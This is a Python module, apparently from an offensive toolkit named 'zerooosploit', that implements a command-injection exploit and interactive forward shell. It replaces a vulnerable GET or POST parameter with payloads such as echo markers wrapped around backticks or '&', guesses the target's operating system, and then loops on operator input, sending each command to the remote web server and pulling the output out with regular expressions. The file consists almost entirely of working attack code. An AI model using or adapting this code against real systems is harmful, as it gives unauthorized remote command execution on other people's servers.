"""
Shell classes

简易命令执行 test
"""
from zerooosploit.printer import *
from zerooosploit.httpclient import *
import urllib.parse
import random
import re
import string


class BaseControl():
    def __init__(self, request_obj: classmethod):
        self.prompt = '$ '
        self.method = request_obj.request.method
        self.url = request_obj.request.url
        self.headers = request_obj.request.headers
        self.body = request_obj.request.body
        self.rand = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        self.rand1 = ''.join(random.sample(string.ascii_letters + string.digits, 8))
        self.cmd_test = 'echo {0}`pwd`{1}'.format(self.rand, self.rand1)
        self.cmd_result = '{0}`pwd`{1}'.format(self.rand, self.rand1)
        PrintThread().start()

    def post_system_check(self, param):
        # post方式检查os
        payload = self.body.replace(urllib.parse.quote_plus(param), self.cmd_test)
        res = HttpClient().send_request_cgi(method=self.method, url=self.url, headers=self.headers, data=payload)
        if res is not None:
            if self.cmd_result in bytes.decode(res.content):
                # windows
                return 0
            else:
                # linux
                return 1

    def get_system_check(self, url, vul_url, param):
        # get方式检查os
        payload = url + urllib.parse.unquote_plus(vul_url).replace(param, self.cmd_test)
        res = HttpClient().send_request_cgi(method=self.method, url=payload, headers=self.headers)
        if res is not None:
            if self.cmd_result in bytes.decode(res.content):
                # windows
                return 0
            else:
                # linux
                return 1

    def base_payload(self, flag, command: str):
        if flag == 0:
            windows = ('echo {0}&' + command + '&echo {1}').format(self.rand, self.rand1)
            return windows
        else:
            linux = ('echo {0}`' + command + '`{1}').format(self.rand, self.rand1)
            return linux


class TakeControl(BaseControl):
    # TODO testing func

    def forward_shell(self, param: str):
        print_queue.join()
        print_blue('[*] Open forward shell tunnel...')
        while True:
            try:
                command = input(self.prompt)
                if not command:
                    continue
                elif command == 'exit':
                    break

                # 执行方法
                # 重新构造请求 定位命令执行位置
                if self.method.upper() == 'POST':
                    if self.post_system_check(param) == 0:
                        # windows
                        payload = self.body.replace(urllib.parse.quote_plus(param), urllib.parse.quote_plus(self.base_payload(0, command)))
                        res = HttpClient().send_request_cgi(method=self.method, url=self.url, headers=self.headers, data=payload)
                        if res is not None:
                            data = re.findall(('{0}(.*?){1}'.format(self.rand, self.rand1)), bytes.decode(res.content, 'gbk'), re.DOTALL)
                            print_white('Output:\n' + ''.join(data))
                    else:
                        # linux
                        payload = self.body.replace(urllib.parse.quote_plus(param), self.base_payload(1, command))
                        res = HttpClient().send_request_cgi(method=self.method, url=self.url, headers=self.headers, data=payload)
                        if res is not None:
                            data = re.findall(('{0}(.*?){1}'.format(self.rand, self.rand1)), bytes.decode(res.content), re.DOTALL)
                            print_white('Output:\n' + ''.join(data))

                else:
                    # GET
                    url = urllib.parse.urlparse(self.url)
                    scheme = url.scheme
                    netloc = url.netloc
                    url1 = scheme + '://' + netloc # http://www.baidu.com/
                    vul_url = self.url.replace(url1, '')
                    if self.get_system_check(url1, vul_url, param) == 0:
                        # windows
                        payload = url1 + urllib.parse.unquote_plus(vul_url).replace(param, self.base_payload(0, command))
                        res = HttpClient().send_request_cgi(method=self.method, url=payload, headers=self.headers)
                        if res is not None:
                            data = re.findall(('{0}(.*?){1}'.format(self.rand, self.rand1)), bytes.decode(res.content, 'gbk'), re.DOTALL)
                            print_white('Output:\n' + ''.join(data))
                    else:
                        # linux
                        payload = url1 + urllib.parse.unquote_plus(vul_url).replace(param, self.base_payload(1, command))
                        res = HttpClient().send_request_cgi(method=self.method, url=payload, headers=self.headers )
                        if res is not None:
                            data = re.findall(('{0}(.*?){1}'.format(self.rand, self.rand1)), bytes.decode(res.content), re.DOTALL)
                            print_white('Output:\n' + ''.join(data))

            except (KeyboardInterrupt, EOFError):
                print_white('Interrupt: use the \'exit\' command to quit')
            finally:
                print_queue.join()
